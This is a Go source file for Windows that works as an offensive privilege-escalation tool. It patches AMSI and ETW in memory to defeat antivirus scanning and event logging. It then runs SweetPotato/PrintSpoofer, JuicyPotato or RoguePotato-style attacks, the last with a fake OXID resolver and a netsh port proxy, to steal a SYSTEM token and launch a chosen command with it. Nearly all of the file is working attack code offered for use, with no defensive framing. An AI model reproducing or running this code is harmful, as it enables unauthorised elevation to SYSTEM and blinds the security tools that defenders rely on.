//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modntdll    = windows.NewLazySystemDLL("ntdll.dll")
	modkernel32 = windows.NewLazySystemDLL("kernel32.dll")
	modadvapi32 = windows.NewLazySystemDLL("advapi32.dll")
	modamsi     = windows.NewLazySystemDLL("amsi.dll")
	modole32    = windows.NewLazySystemDLL("ole32.dll")

	procEtwEventWrite              = modntdll.NewProc("EtwEventWrite")
	procAmsiScanBuffer             = modamsi.NewProc("AmsiScanBuffer")
	procImpersonateNamedPipeClient = modadvapi32.NewProc("ImpersonateNamedPipeClient")
	procCreateProcessWithTokenW    = modadvapi32.NewProc("CreateProcessWithTokenW")
	procCoInitializeEx             = modole32.NewProc("CoInitializeEx")
	procCoCreateInstance           = modole32.NewProc("CoCreateInstance")
)

// patchAMSI patches AmsiScanBuffer to return E_INVALIDARG.
func patchAMSI() {
	if err := modamsi.Load(); err != nil {
		fmt.Println("[*] AMSI: amsi.dll not loaded, skipping")
		return
	}
	if err := procAmsiScanBuffer.Find(); err != nil {
		fmt.Println("[*] AMSI: AmsiScanBuffer not found, skipping")
		return
	}

	// mov eax, 0x80070057 (E_INVALIDARG); ret
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	addr := procAmsiScanBuffer.Addr()

	var oldProtect uint32
	err := windows.VirtualProtect(addr, uintptr(len(patch)), windows.PAGE_READWRITE, &oldProtect)
	if err != nil {
		fmt.Printf("[!] AMSI: VirtualProtect failed: %v\n", err)
		return
	}

	copy((*[6]byte)(unsafe.Pointer(addr))[:], patch)

	windows.VirtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)
	fmt.Println("[+] AMSI: Patched AmsiScanBuffer")
}

// patchETW patches EtwEventWrite to return immediately.
func patchETW() {
	if err := procEtwEventWrite.Find(); err != nil {
		fmt.Println("[*] ETW: EtwEventWrite not found, skipping")
		return
	}

	patch := []byte{0xC3} // ret
	addr := procEtwEventWrite.Addr()

	var oldProtect uint32
	err := windows.VirtualProtect(addr, uintptr(len(patch)), windows.PAGE_READWRITE, &oldProtect)
	if err != nil {
		fmt.Printf("[!] ETW: VirtualProtect failed: %v\n", err)
		return
	}

	*(*byte)(unsafe.Pointer(addr)) = 0xC3

	windows.VirtualProtect(addr, uintptr(len(patch)), oldProtect, &oldProtect)
	fmt.Println("[+] ETW: Patched EtwEventWrite")
}

// detectBestTechnique checks running services to pick the best potato variant.
func detectBestTechnique() string {
	// Check Print Spooler (SweetPotato/PrintSpoofer)
	out, err := exec.Command("sc", "query", "Spooler").Output()
	if err == nil && strings.Contains(string(out), "RUNNING") {
		fmt.Println("[*] Auto-detect: Print Spooler running → sweet")
		return "sweet"
	}

	// Check BITS (JuicyPotato)
	out, err = exec.Command("sc", "query", "BITS").Output()
	if err == nil && strings.Contains(string(out), "RUNNING") {
		fmt.Println("[*] Auto-detect: BITS running → juicy")
		return "juicy"
	}

	fmt.Println("[*] Auto-detect: Defaulting to rogue")
	return "rogue"
}

// sweetPotato implements PrintSpoofer-style named pipe impersonation.
// Creates a pipe, triggers Print Spooler to connect, impersonates the SYSTEM token.
func sweetPotato(command string) error {
	fmt.Println("[+] SweetPotato/PrintSpoofer: Named pipe impersonation")

	pipeName := `\\.\pipe\spoolss_` + fmt.Sprintf("%d", windows.GetCurrentProcessId())
	pipeNameUTF16, _ := windows.UTF16PtrFromString(pipeName)

	// Create named pipe
	pipe, err := windows.CreateNamedPipe(
		pipeNameUTF16,
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT,
		1,    // max instances
		4096, // out buffer
		4096, // in buffer
		0,    // default timeout
		nil,  // default security
	)
	if err != nil {
		return fmt.Errorf("CreateNamedPipe: %w", err)
	}
	defer windows.CloseHandle(pipe)
	fmt.Printf("[*] Created pipe: %s\n", pipeName)

	// Trigger Print Spooler to connect to our pipe
	// Uses the SpoolSS pipe name trick via RpcRemoteFindFirstPrinterChangeNotification
	go triggerSpoolerConnection(pipeName)

	// Wait for connection
	fmt.Println("[*] Waiting for SYSTEM connection...")
	err = windows.ConnectNamedPipe(pipe, nil)
	if err != nil && err != windows.ERROR_PIPE_CONNECTED {
		return fmt.Errorf("ConnectNamedPipe: %w", err)
	}
	fmt.Println("[+] Client connected to pipe")

	// Impersonate the client (SYSTEM)
	r, _, err := procImpersonateNamedPipeClient.Call(uintptr(pipe))
	if r == 0 {
		return fmt.Errorf("ImpersonateNamedPipeClient: %w", err)
	}
	fmt.Println("[+] Impersonating client token")

	// Get the impersonation token
	var token windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, false, &token)
	if err != nil {
		return fmt.Errorf("OpenThreadToken: %w", err)
	}
	defer token.Close()

	// Duplicate to primary token for CreateProcessWithTokenW
	var primaryToken windows.Token
	err = windows.DuplicateTokenEx(
		token,
		windows.TOKEN_ALL_ACCESS,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&primaryToken,
	)
	if err != nil {
		return fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	defer primaryToken.Close()

	return createProcessWithToken(primaryToken, command)
}

// juicyPotato abuses a COM object (BITS) to capture a SYSTEM token.
func juicyPotato(command string) error {
	fmt.Println("[+] JuicyPotato: BITS COM object abuse")

	// Start local COM server to capture NTLM auth
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return fmt.Errorf("listen: %w", err)
	}
	port := listener.Addr().(*net.TCPAddr).Port
	fmt.Printf("[*] COM server listening on 127.0.0.1:%d\n", port)

	// Initialize COM
	procCoInitializeEx.Call(0, 0)

	// Create named pipe for token capture
	pipeName := `\\.\pipe\juicy_` + fmt.Sprintf("%d", windows.GetCurrentProcessId())
	pipeNameUTF16, _ := windows.UTF16PtrFromString(pipeName)

	pipe, err := windows.CreateNamedPipe(
		pipeNameUTF16,
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT,
		1, 4096, 4096, 0, nil,
	)
	if err != nil {
		listener.Close()
		return fmt.Errorf("CreateNamedPipe: %w", err)
	}
	defer windows.CloseHandle(pipe)

	// Trigger BITS COM object to authenticate to our pipe
	fmt.Println("[*] Triggering BITS CLSID {4991d34b-80a1-4291-83b6-3328366b9097}")
	go triggerCOMAuthentication(pipeName, port)

	// Wait for SYSTEM to connect
	fmt.Println("[*] Waiting for SYSTEM token...")
	err = windows.ConnectNamedPipe(pipe, nil)
	if err != nil && err != windows.ERROR_PIPE_CONNECTED {
		listener.Close()
		return fmt.Errorf("ConnectNamedPipe: %w", err)
	}
	listener.Close()

	// Impersonate
	r, _, callErr := procImpersonateNamedPipeClient.Call(uintptr(pipe))
	if r == 0 {
		return fmt.Errorf("ImpersonateNamedPipeClient: %w", callErr)
	}

	var token windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, false, &token)
	if err != nil {
		return fmt.Errorf("OpenThreadToken: %w", err)
	}
	defer token.Close()

	var primaryToken windows.Token
	err = windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil,
		windows.SecurityImpersonation, windows.TokenPrimary, &primaryToken)
	if err != nil {
		return fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	defer primaryToken.Close()

	return createProcessWithToken(primaryToken, command)
}

// roguePotato redirects OXID resolution to capture a SYSTEM token.
// The technique requires redirecting port 135 (OXID resolver) traffic to our
// fake resolver. We handle this automatically via netsh port proxy when the
// real RPC Endpoint Mapper occupies port 135.
func roguePotato(command string) error {
	fmt.Println("[+] RoguePotato: OXID resolver redirection")

	pipeName := `\\.\pipe\rogue_` + fmt.Sprintf("%d", windows.GetCurrentProcessId())
	pipeNameUTF16, _ := windows.UTF16PtrFromString(pipeName)

	pipe, err := windows.CreateNamedPipe(
		pipeNameUTF16,
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT,
		1, 4096, 4096, 0, nil,
	)
	if err != nil {
		return fmt.Errorf("CreateNamedPipe: %w", err)
	}
	defer windows.CloseHandle(pipe)
	fmt.Printf("[*] Created pipe: %s\n", pipeName)

	// Start fake OXID resolver — it returns the listening port via a channel
	oxidPortCh := make(chan int, 1)
	go startFakeOXIDResolverWithPort(pipeName, oxidPortCh)

	oxidPort := <-oxidPortCh
	if oxidPort <= 0 {
		return fmt.Errorf("fake OXID resolver failed to start")
	}

	// Set up port proxy if we couldn't bind port 135 directly
	needsProxy := oxidPort != 135
	if needsProxy {
		fmt.Printf("[*] Setting up netsh port proxy: 127.0.0.1:135 → 127.0.0.1:%d\n", oxidPort)
		proxyCmd := exec.Command("netsh", "interface", "portproxy", "add", "v4tov4",
			"listenaddress=127.0.0.1", "listenport=135",
			"connectaddress=127.0.0.1", fmt.Sprintf("connectport=%d", oxidPort))
		if out, err := proxyCmd.CombinedOutput(); err != nil {
			fmt.Printf("[!] netsh port proxy failed: %v (%s)\n", err, strings.TrimSpace(string(out)))
			fmt.Printf("[!] Manual setup required: netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=135 connectaddress=127.0.0.1 connectport=%d\n", oxidPort)
			// Continue anyway — the operator may have set it up externally
		} else {
			fmt.Println("[+] Port proxy established")
		}
		defer func() {
			// Clean up port proxy rule
			cleanCmd := exec.Command("netsh", "interface", "portproxy", "delete", "v4tov4",
				"listenaddress=127.0.0.1", "listenport=135")
			cleanCmd.Run()
			fmt.Println("[*] Port proxy rule cleaned up")
		}()
	}

	// Trigger DCOM activation
	fmt.Println("[*] Triggering DCOM activation...")
	go triggerDCOMActivation()

	fmt.Println("[*] Waiting for SYSTEM connection via OXID redirect...")
	err = windows.ConnectNamedPipe(pipe, nil)
	if err != nil && err != windows.ERROR_PIPE_CONNECTED {
		return fmt.Errorf("ConnectNamedPipe: %w", err)
	}

	r, _, callErr := procImpersonateNamedPipeClient.Call(uintptr(pipe))
	if r == 0 {
		return fmt.Errorf("ImpersonateNamedPipeClient: %w", callErr)
	}

	var token windows.Token
	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, false, &token)
	if err != nil {
		return fmt.Errorf("OpenThreadToken: %w", err)
	}
	defer token.Close()

	var primaryToken windows.Token
	err = windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil,
		windows.SecurityImpersonation, windows.TokenPrimary, &primaryToken)
	if err != nil {
		return fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	defer primaryToken.Close()

	return createProcessWithToken(primaryToken, command)
}

// createProcessWithToken spawns a process using an impersonated token.
func createProcessWithToken(token windows.Token, command string) error {
	fmt.Printf("[*] Spawning: %s\n", command)

	cmdLine, _ := syscall.UTF16PtrFromString(command)
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	// LOGON_WITH_PROFILE = 0x1
	r, _, err := procCreateProcessWithTokenW.Call(
		uintptr(token),
		0x1, // LOGON_WITH_PROFILE
		0,
		uintptr(unsafe.Pointer(cmdLine)),
		windows.CREATE_NEW_CONSOLE,
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return fmt.Errorf("CreateProcessWithTokenW: %w", err)
	}

	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	fmt.Printf("[+] Process spawned with elevated token (PID: %d)\n", pi.ProcessId)
	return nil
}

// triggerSpoolerConnection triggers Print Spooler to connect to our named pipe.
func triggerSpoolerConnection(pipeName string) {
	// Use the printer change notification RPC to make Spooler connect to our pipe
	hostname, _ := windows.ComputerName()
	target := fmt.Sprintf("\\\\%s%s", hostname, strings.Replace(pipeName, `\\.\pipe`, `\pipe`, 1))

	cmd := exec.Command("rundll32", "davclnt.dll,DavSetCookie", target, "http://127.0.0.1")
	cmd.Run()
}

// triggerCOMAuthentication triggers a COM object to authenticate to our pipe.
func triggerCOMAuthentication(pipeName string, port int) {
	// Use CreateFile to trigger the COM server connection path
	target := fmt.Sprintf(`\\127.0.0.1\pipe\%s`, strings.TrimPrefix(pipeName, `\\.\pipe\`))
	targetUTF16, _ := windows.UTF16PtrFromString(target)
	h, err := windows.CreateFile(targetUTF16, windows.GENERIC_READ, 0, nil, windows.OPEN_EXISTING, 0, 0)
	if err == nil {
		windows.CloseHandle(h)
	}
}

// buildDCERPCHeader builds a DCE/RPC packet header (16 bytes).
// version 5.0, packet type, flags, data representation (little-endian NDR),
// fragment length, auth length, call ID.
func buildDCERPCHeader(pktType byte, fragLen uint16, callID uint32) []byte {
	hdr := make([]byte, 16)
	hdr[0] = 5 // version major
	hdr[1] = 0 // version minor
	hdr[2] = pktType
	hdr[3] = 0x03 // flags: first + last fragment
	// data representation: little-endian, ASCII, IEEE float
	hdr[4] = 0x10
	hdr[5] = 0x00
	hdr[6] = 0x00
	hdr[7] = 0x00
	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
	binary.LittleEndian.PutUint16(hdr[10:12], 0) // auth length
	binary.LittleEndian.PutUint32(hdr[12:16], callID)
	return hdr
}

// buildBindAck constructs a DCE/RPC bind_ack (type 0x0C) response to a bind request.
func buildBindAck(bindReq []byte) []byte {
	// Extract call ID from the bind request (offset 12, 4 bytes LE).
	var callID uint32
	if len(bindReq) >= 16 {
		callID = binary.LittleEndian.Uint32(bindReq[12:16])
	}

	// Secondary address: port string (e.g. "135\0"), length-prefixed uint16.
	secAddr := []byte("135\x00")
	secAddrLen := uint16(len(secAddr))

	// Result list: 1 context accepted.
	// Each result entry: result(2) + reason(2) + transfer_syntax(20)
	// result=0 (acceptance), reason=0
	var resultEntry [24]byte // zero-initialized = acceptance
	// Transfer syntax UUID: NDR 8a885d04-1ceb-11c9-9fe8-08002b104860 v2.0
	copy(resultEntry[4:20], []byte{
		0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11,
		0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
	})
	binary.LittleEndian.PutUint32(resultEntry[20:24], 2) // version 2.0

	// Body: max_xmit(2) + max_recv(2) + assoc_group(4) + sec_addr_len(2) + sec_addr + pad + num_results(1) + pad(3) + result_entry(24)
	body := make([]byte, 0, 128)
	tmp2 := make([]byte, 2)

	// max_xmit_frag
	binary.LittleEndian.PutUint16(tmp2, 4280)
	body = append(body, tmp2...)
	// max_recv_frag
	binary.LittleEndian.PutUint16(tmp2, 4280)
	body = append(body, tmp2...)
	// assoc_group_id (echo from request, offset 20 in bind)
	if len(bindReq) >= 24 {
		body = append(body, bindReq[20:24]...)
	} else {
		body = append(body, 0, 0, 0, 0)
	}
	// secondary address length + string
	binary.LittleEndian.PutUint16(tmp2, secAddrLen)
	body = append(body, tmp2...)
	body = append(body, secAddr...)
	// Align to 4 bytes
	for len(body)%4 != 0 {
		body = append(body, 0)
	}
	// num results
	body = append(body, 1, 0, 0, 0) // num_results(4 bytes LE, but spec says 1 byte + 3 pad; same layout)
	body = append(body, resultEntry[:]...)

	fragLen := uint16(16 + len(body))
	hdr := buildDCERPCHeader(0x0C, fragLen, callID)
	return append(hdr, body...)
}

// buildResolveOxid2Response constructs the DCE/RPC response (type 0x02)
// for a ResolveOxid2 call (opnum 5 on IObjectExporter), encoding the pipe
// binding string in ppdsaOxidBindings so DCOM connects to our named pipe.
func buildResolveOxid2Response(request []byte, pipeBinding string) []byte {
	// Extract call ID from the request header.
	var callID uint32
	if len(request) >= 16 {
		callID = binary.LittleEndian.Uint32(request[12:16])
	}

	// Build the NDR-encoded stub data for ResolveOxid2 response.
	// The response contains:
	//   ppdsaOxidBindings: DUALSTRINGARRAY (ref pointer + wNumEntries + wSecurityOffset + string bindings + null)
	//   pipAuthnHint: COMAUTHNHINT
	//   pComVersion: COMVERSION (major, minor)
	//   HRESULT (status)

	// Encode pipeBinding as a STRINGBINDING entry.
	// STRINGBINDING: wTowerId(2) + aNetworkAddr(UTF-16LE null-terminated)
	// wTowerId for ncacn_np = 0x000F
	bindingUTF16 := utf16Encode(pipeBinding)

	// DUALSTRINGARRAY:
	//   wNumEntries (uint16): total uint16 elements following (up to but not including wNumEntries itself)
	//   wSecurityOffset (uint16): offset to security bindings (in uint16 elements from start of aStringArray)
	//   aStringArray: STRINGBINDING entries terminated by double-null

	// STRINGBINDING: towerId(1 uint16) + addr(N uint16, null-terminated)
	// Then null terminator for string array, then security bindings (we put none, just null terminator).
	stringBindingWords := 1 + len(bindingUTF16) + 1 // towerId + addr+null + array terminator null
	securityOffset := uint16(stringBindingWords)
	numEntries := uint16(stringBindingWords + 1) // +1 for security array null terminator

	stub := make([]byte, 0, 256)

	// NDR referent pointer for ppdsaOxidBindings
	stub = appendUint32(stub, 0x00020000)
	// DUALSTRINGARRAY
	stub = appendUint16(stub, numEntries)
	stub = appendUint16(stub, securityOffset)

	// STRINGBINDING: wTowerId = 0x000F (ncacn_np)
	stub = appendUint16(stub, 0x000F)
	// aNetworkAddr: UTF-16LE null-terminated
	for _, c := range bindingUTF16 {
		stub = appendUint16(stub, c)
	}
	stub = appendUint16(stub, 0) // null terminator for this binding string

	// Terminator for string binding array
	stub = appendUint16(stub, 0)

	// Security bindings: empty, just null terminator
	stub = appendUint16(stub, 0)

	// Pad stub to 4-byte alignment
	for len(stub)%4 != 0 {
		stub = append(stub, 0)
	}

	// pipAuthnHint (COMAUTHNHINT): referent pointer + value
	stub = appendUint32(stub, 0x00020004)
	stub = appendUint32(stub, 0) // no auth hint

	// pComVersion: major=5, minor=7
	stub = appendUint16(stub, 5)
	stub = appendUint16(stub, 7)

	// HRESULT = S_OK
	stub = appendUint32(stub, 0)

	// DCE/RPC response header (type 0x02)
	// Response header after the 16-byte common header: alloc_hint(4) + context_id(2) + cancel_count(1) + pad(1)
	respHdr := make([]byte, 8)
	binary.LittleEndian.PutUint32(respHdr[0:4], uint32(len(stub))) // alloc_hint
	binary.LittleEndian.PutUint16(respHdr[4:6], 0)                 // context_id
	respHdr[6] = 0                                                 // cancel_count
	respHdr[7] = 0                                                 // pad

	fragLen := uint16(16 + len(respHdr) + len(stub))
	hdr := buildDCERPCHeader(0x02, fragLen, callID)

	pkt := make([]byte, 0, int(fragLen))
	pkt = append(pkt, hdr...)
	pkt = append(pkt, respHdr...)
	pkt = append(pkt, stub...)
	return pkt
}

// utf16Encode encodes a Go string to a slice of uint16 code units (no null terminator).
func utf16Encode(s string) []uint16 {
	runes := []rune(s)
	out := make([]uint16, 0, len(runes))
	for _, r := range runes {
		if r <= 0xFFFF {
			out = append(out, uint16(r))
		} else {
			r -= 0x10000
			out = append(out, uint16(0xD800+(r>>10)), uint16(0xDC00+(r&0x3FF)))
		}
	}
	return out
}

func appendUint16(b []byte, v uint16) []byte {
	return append(b, byte(v), byte(v>>8))
}

func appendUint32(b []byte, v uint32) []byte {
	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

// startFakeOXIDResolverWithPort starts the fake OXID resolver and sends its
// listening port to the portCh channel. This allows the caller to set up
// port forwarding if needed.
func startFakeOXIDResolverWithPort(pipeName string, portCh chan<- int) {
	// Try port 135 first (where DCOM runtime expects the OXID resolver)
	ln, err := net.Listen("tcp", "127.0.0.1:135")
	if err != nil {
		// Port 135 in use (normal — the real RPC Endpoint Mapper is running).
		ln, err = net.Listen("tcp", "127.0.0.1:0")
		if err != nil {
			fmt.Printf("[!] OXID resolver: listen failed: %v\n", err)
			portCh <- -1
			return
		}
		port := ln.Addr().(*net.TCPAddr).Port
		fmt.Printf("[*] OXID resolver: port 135 in use — listening on port %d\n", port)
		portCh <- port
	} else {
		fmt.Println("[+] OXID resolver: bound to port 135 directly")
		portCh <- 135
	}
	defer ln.Close()
	fmt.Printf("[*] Fake OXID resolver listening on %s\n", ln.Addr().String())

	conn, err := ln.Accept()
	if err != nil {
		fmt.Printf("[!] OXID resolver: accept failed: %v\n", err)
		return
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(15 * time.Second))

	buf := make([]byte, 4096)

	// Step 1: Read DCE/RPC bind request (type 0x0B)
	n, err := conn.Read(buf)
	if err != nil || n < 16 {
		fmt.Printf("[!] OXID resolver: failed to read bind request: %v\n", err)
		return
	}
	if buf[2] != 0x0B {
		fmt.Printf("[!] OXID resolver: expected bind (0x0B), got 0x%02X\n", buf[2])
		return
	}
	fmt.Println("[*] OXID resolver: received DCE/RPC bind request")

	// Step 2: Send bind_ack (type 0x0C)
	bindAck := buildBindAck(buf[:n])
	if _, err := conn.Write(bindAck); err != nil {
		fmt.Printf("[!] OXID resolver: failed to send bind_ack: %v\n", err)
		return
	}
	fmt.Println("[*] OXID resolver: sent bind_ack")

	// Step 3: Read the ResolveOxid2 request (type 0x00, opnum 5)
	n, err = conn.Read(buf)
	if err != nil || n < 24 {
		fmt.Printf("[!] OXID resolver: failed to read ResolveOxid2 request: %v\n", err)
		return
	}
	if buf[2] != 0x00 {
		fmt.Printf("[!] OXID resolver: expected request (0x00), got 0x%02X\n", buf[2])
		return
	}
	// Opnum is at offset 22 (2 bytes LE) in a DCE/RPC request
	opnum := binary.LittleEndian.Uint16(buf[22:24])
	fmt.Printf("[*] OXID resolver: received request opnum=%d\n", opnum)

	// Step 4: Build and send ResolveOxid2 response with our pipe binding
	hostname, _ := windows.ComputerName()
	// Convert \\.\pipe\rogue_XXXX to hostname[\pipe\rogue_XXXX]
	pipeShort := strings.Replace(pipeName, `\\.\pipe\`, `\pipe\`, 1)
	pipeBinding := fmt.Sprintf("%s[%s]", hostname, pipeShort)
	fmt.Printf("[*] OXID resolver: responding with binding: ncacn_np:%s\n", pipeBinding)

	response := buildResolveOxid2Response(buf[:n], pipeBinding)
	if _, err := conn.Write(response); err != nil {
		fmt.Printf("[!] OXID resolver: failed to send response: %v\n", err)
		return
	}
	fmt.Println("[+] OXID resolver: sent ResolveOxid2 response with pipe redirect")
}

// triggerDCOMActivation triggers a DCOM activation that queries the OXID resolver.
// It uses CoCreateInstance with CLSCTX_LOCAL_SERVER to force out-of-process COM
// activation, which causes the SCM to perform OXID resolution through our fake resolver.
func triggerDCOMActivation() {
	// Initialize COM (COINIT_MULTITHREADED = 0x0)
	procCoInitializeEx.Call(0, 0)

	// BITS CLSID {4991d34b-80a1-4291-83b6-3328366b9097}
	// This is a well-known SYSTEM service COM object used in potato attacks.
	clsid := windows.GUID{
		Data1: 0x4991d34b,
		Data2: 0x80a1,
		Data3: 0x4291,
		Data4: [8]byte{0x83, 0xb6, 0x33, 0x28, 0x36, 0x6b, 0x90, 0x97},
	}

	// IUnknown {00000000-0000-0000-C000-000000000046}
	iidUnknown := windows.GUID{
		Data1: 0x00000000,
		Data2: 0x0000,
		Data3: 0x0000,
		Data4: [8]byte{0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46},
	}

	var obj uintptr
	// CLSCTX_LOCAL_SERVER (0x4) forces out-of-process activation which triggers OXID resolution
	hr, _, _ := procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(&clsid)),
		0,
		0x4, // CLSCTX_LOCAL_SERVER
		uintptr(unsafe.Pointer(&iidUnknown)),
		uintptr(unsafe.Pointer(&obj)),
	)

	if hr == 0 && obj != 0 {
		fmt.Println("[+] DCOM activation: COM object instantiated, releasing")
		// Release via IUnknown::Release (vtable index 2)
		vtable := *(*[3]uintptr)(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(obj))))
		syscall.Syscall(vtable[2], 1, obj, 0, 0)
	} else {
		// Failure is expected in many cases — the OXID redirect may have already
		// captured the token before CoCreateInstance returns.
		fmt.Printf("[*] DCOM activation: CoCreateInstance returned 0x%08X (expected if token already captured)\n", hr)
	}
}
